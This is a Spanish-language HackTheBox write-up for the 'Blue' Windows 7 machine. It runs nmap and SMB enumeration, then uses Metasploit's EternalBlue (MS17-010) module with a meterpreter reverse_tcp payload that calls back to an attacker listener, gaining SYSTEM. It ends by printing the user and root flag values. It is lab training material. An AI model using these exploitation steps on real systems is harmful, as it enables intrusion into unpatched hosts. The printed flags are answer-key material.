# Blue

Plataforma: HackTheBox
OS: Windows
Level: Easy
Status: Done
Complete: Yes
EJPT: yes
Created time: 26 de enero de 2025 16:36
IP: 10.10.10.40

## Recopilación de información

<aside>
💡 Reconocimiento general

</aside>

Que sistema 

```bash
whichSystem.py 10.10.10.40

	10.10.10.40 (ttl -> 127): Windows
```

### **Escaneo de puertos**

Comenzamos con un escaneo para identificar que puertos están abiertos.

---

```bash
sudo nmap -p- --open -T5 -sS --min-rate 5000 -n -Pn -vvv 10.10.10.40 -oG targeted

PORT      STATE SERVICE      REASON
135/tcp   open  msrpc        syn-ack ttl 127
139/tcp   open  netbios-ssn  syn-ack ttl 127
445/tcp   open  microsoft-ds syn-ack ttl 127
49152/tcp open  unknown      syn-ack ttl 127
49154/tcp open  unknown      syn-ack ttl 127
49156/tcp open  unknown      syn-ack ttl 127
49157/tcp open  unknown      syn-ack ttl 127
```

### **Enumeración de servicios**

Una vez listado los puertos accesibles, procederemos a realizar la enumeración de servicios para su posterior identificación de vulnerabilidades.

---

```bash
❯ sudo nmap -p135,139,445 -sCV 10.10.10.40 -oN targeted

PORT    STATE SERVICE      VERSION
135/tcp open  msrpc        Microsoft Windows RPC
139/tcp open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp open  microsoft-ds Windows 7 Professional 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)
Service Info: Host: HARIS-PC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2:1:0: 
|_    Message signing enabled but not required
|_clock-skew: mean: 2s, deviation: 2s, median: 1s
| smb-os-discovery: 
|   OS: Windows 7 Professional 7601 Service Pack 1 (Windows 7 Professional 6.1)
|   OS CPE: cpe:/o:microsoft:windows_7::sp1:professional
|   Computer name: haris-PC
|   NetBIOS computer name: HARIS-PC\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2025-01-26T15:40:38+00:00
| smb2-time: 
|   date: 2025-01-26T15:40:39
|_  start_date: 2025-01-26T15:36:56
```

- **Identificación de vulnerabilidades**
    - 135/tcp open  msrpc        Microsoft Windows RPC
    - 139/tcp open  netbios-ssn  Microsoft Windows netbios-ssn
    - 445/tcp open  microsoft-ds Windows 7 Professional 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)

- **Enumeramos el HOST (139-445)**
    
    Enumeramos los recursos compartidos de la maquina
    
    ```bash
    smbclient -L 10.10.10.40 -N 
    
    	Sharename       Type      Comment
    	---------       ----      -------
    	ADMIN$          Disk      Remote Admin
    	C$              Disk      Default share
    	IPC$            IPC       Remote IPC
    	Share           Disk      
    	Users           Disk      
    ```
    
    Vemos que es un Windows 7 y probamos con metasploit si es vulnerable a EternalBlue
    
    Vemos que si.
    
    ```bash
    msf6 auxiliary(scanner/smb/smb_ms17_010) > show options
    msf6 auxiliary(scanner/smb/smb_ms17_010) > set RHOST 10.10.10.40
    RHOST => 10.10.10.40
    msf6 auxiliary(scanner/smb/smb_ms17_010) > run
    
    [+] 10.10.10.40:445       - Host is likely VULNERABLE to MS17-010! - Windows 7 Professional 7601 Service Pack 1 x64 (64-bit)
    [*] 10.10.10.40:445       - Scanned 1 of 1 hosts (100% complete)
    [*] Auxiliary module execution completed
    msf6 auxiliary(scanner/smb/smb_ms17_010) > 
    ```
    
    Procedemos a ejecutar el exploit en la Explotacion 1
    

## Explotación

<aside>
💡 Probamos diferentes accesos

</aside>

### Explotación 1

Probamos a ejecutar EternalBlue

```bash
msf6 > search eternal blue

Matching Modules
================
0   exploit/windows/smb/ms17_010_eternalblue       2017-03-14       average  Yes    MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption

msf6 exploit(windows/smb/ms17_010_eternalblue) > show options

Module options (exploit/windows/smb/ms17_010_eternalblue):

   Name           Current Setting  Required  Description
   ----           ---------------  --------  -----------
   RHOSTS                          yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
   RPORT          445              yes       The target port (TCP)
   SMBDomain                       no        (Optional) The Windows domain to use for authentication. Only affects Windows Server 2008 R2, Windows 7, Windows Embedded Standard 7 target
                                              machines.
   SMBPass                         no        (Optional) The password for the specified username
   SMBUser                         no        (Optional) The username to authenticate as
   VERIFY_ARCH    true             yes       Check if remote architecture matches exploit Target. Only affects Windows Server 2008 R2, Windows 7, Windows Embedded Standard 7 target mac
                                             hines.
   VERIFY_TARGET  true             yes       Check if remote OS matches exploit Target. Only affects Windows Server 2008 R2, Windows 7, Windows Embedded Standard 7 target machines.

Payload options (windows/x64/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     192.168.70.128   yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port

Exploit target:

   Id  Name
   --  ----
   0   Automatic Target
   
   
msf6 exploit(windows/smb/ms17_010_eternalblue) > set RHOST 10.10.10.40
RHOST => 10.10.10.40
msf6 exploit(windows/smb/ms17_010_eternalblue) > run

```

### 

```bash

```

### Explotación posterior

<aside>
💡 Accedemos con metasploit a una consola meterpreter con usuario NT AUTHORITY\SYSTEM

</aside>

Obtenemos las flags del usuario haris y Administrator:

```bash
C:\Users\haris\Desktop>type user.txt
type user.txt
d552c4ae981f914576c21f1c689830b9

C:\Users\Administrator\Desktop>type root.txt
type root.txt
9ff673e656d4416b02b43e4c1ab509c4
```

## Conclusión

<aside>
💡 Maquina fácil sin escalada de privilegios

</aside>